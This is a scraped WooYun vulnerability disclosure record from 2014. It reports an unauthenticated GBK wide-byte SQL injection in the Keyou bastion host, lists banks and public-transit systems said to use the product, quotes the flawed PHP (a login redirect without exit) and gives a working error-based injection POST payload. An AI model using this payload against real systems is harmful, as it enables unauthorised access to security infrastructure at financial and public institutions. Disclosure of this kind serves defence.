{"id": 48612, "wybug_id": "wooyun-2014-077088", "wybug_title": "江南科友堡垒机无需登录通用注入漏洞", "wybug_corp": "江南科友科技有限公司", "wybug_author": "conqu3r", "wybug_date": "2014-09-24 09:09", "wybug_open_date": "2014-12-23 09:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-23：\t细节向公众公开  简要描述： 通用注入漏洞，不需要登录！ 详细说明：  江南科友堡垒机全版本getshell（无需登录）#1 漏洞设计客户如下：国内各大银行：中国银行、民生银行、广东发展银行、平安银行、深圳发展银行、浦发银行、渤海银行总行及各分行、中国工商银行、中国农业银行、中国建设银行、交通银行、招商银行、中信银行、兴业银行、华夏银行、中国邮政储蓄银行总行或部分分行中国银联：总公司及北京、广州、深圳、南京、福州、长沙、武汉、济南、青岛、沈阳、郑州、海口、天津、香港、厦门等分公司银联数据：全国卡系统业务托管商业银行外资银行：渣打银行、东亚银行：全国境内各个分行外资金融机构：韩亚银行、花旗银行、通用电气、星展银行、美国第一资讯（FDC)地方商业银行及农村信用社：40余家商业银行及农村信用社社会保障与公共交通系统：湖北、黑龙江、广东、北京等社保卡安全系统，上海市公交一卡通安全系统，杭州市市民卡系统，长春一汽企业IC卡加密系统，宁波市民卡系统，郑州交通一卡通系统，山东一卡通系统（摘自官网：http://www.keyou.cn/JN_case/case-cg.aspx）请自查....   漏洞证明：  存在GBK宽字节注入。漏洞文件/manager/config_os.php\n<?\t\t\trequire_once('interface.php');\t\t\trequire_once('SSO_DB.php');\t\t\trequire_once('class.smarttemplate.php');\t\t\t\t\t\t//session_id(SID);\t\t\tsession_start();\t\t\t$account_os=$_SESSION['account_os'];\t\t\t$time = $_SESSION['time'];\t\t\t$error=0;\t\t\t//echo $time;\t\t\t//echo $_GET['flag'];\t\t\tif( empty($account_os) || $_GET['flag'] != $time || empty($_GET['flag']) )\t\t\t{\t\t\t\tHeader(\"Location: login.php\"); //没有增加exit(1)导致后续语句继续执行，并没有退出，后续就可以直接注入了。\t\t\t}\t\t\t$st = new SmartTemplate('config_os.html'); \t\t\t$db = new SSO_DB();\t\t\tif(isset($_POST['action']) && !empty($_POST['action']))//ɾ������ҳ��\t\t\t{\t\t\t\tif($_POST['action'] == 'add')  //���\t\t\t\t{\t\t\t\t\t$add_s=$db->os_add($_POST['f_os_name'],$_POST['v_os_name'],$_POST['os_mem'],$_POST['AdminCmd_value'],$_POST['AdminPassInfo_value']);\t\t\t\t\tif(!$add_s)\t\t\t\t\t{\t\t\t\t\t\t//echo '<script type=\"text/javascript\">';\t\t\t\t\t\t//echo 'alert(\"����ϵͳ����Ѵ���\")';\t\t\t\t\t\t//echo '</script>';\t\t\t\t\t\t$error = -1;\t\t\t\t\t}\t\t\t\t\telse\t\t\t\t\t{\t\t\t\t\t\twrite_ed();\t\t\t\t\t\t//echo '<script type=\"text/javascript\">';\t\t\t\t\t\t//echo 'alert(\"��ӳɹ�\")';\t\t\t\t\t\t//echo '</script>';\t\t\t\t\t\t$error = 1;\t\t\t\t\t}\t\t\t\t}\t\t\t\tif($_POST['action'] == 'del')  //ɾ��\t\t\t\t{\t\t\t\t\t//echo $_POST['post_id'];\t\t\t\t\t$db->os_del($_POST['post_id']);\t\t\t\t\twrite_ed();\t\t\t\t\t//echo '<script type=\"text/javascript\">';\t\t\t\t\t//echo 'alert(\"ɾ��ɹ�\")';\t\t\t\t\t//echo '</script>';\t\t\t\t\t$error = 2;\t\t\t\t}\t\t\t}\t\t\tif(isset($_POST['edit_id']) && $_POST['action']== 'edit' && !empty($_POST['edit_id']) )  //�༭ȡ���\t\t\t{\t\t\t\t\t\t\t\t\t$db->os_edit($_POST['f_os_name'],$_POST['v_os_name'],$_POST['os_mem'],$_POST['edit_id'],$_POST['AdminCmd_value'],$_POST['AdminPassInfo_value']); //GBK注入\t\t\t\t\twrite_ed();\t\t\t\t\t//echo '<script type=\"text/javascript\">';\t\t\t\t\t//echo 'alert(\"�༭�ɹ�\")';\t\t\t\t\t//echo '</script>';\t\t\t\t\t$error = 3;\t\t\t}\n利用payload:\nPOST /manager/config_os.php HTTP/1.1Host: x.x.x.xAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Proxy-Connection: keep-aliveCookie: PHPSESSID=676fe13cb82d5ba15baccdd1decc0bebUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10Accept-Language: zh-cnAccept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 209action=add&f_os_name=admin%df'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)#&v_os_name=1&os_mem=2&admincmd_value=3&adminpassinfo_value=4\n\n\n该文件的add del方法都存在注入。   修复方案：  处理   版权声明：转载请注明来源 conqu3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-09-28 09:42 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-24 11:58 |    \t\t孔卡 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:12        | 我已经过了那个餐桌上只有一条鸡腿就一定能...)\t\t \n  这是下一个网康的节奏吗？？？？    \n     2014-09-30 19:54 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  @xsser  这个居然没发钱啊！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}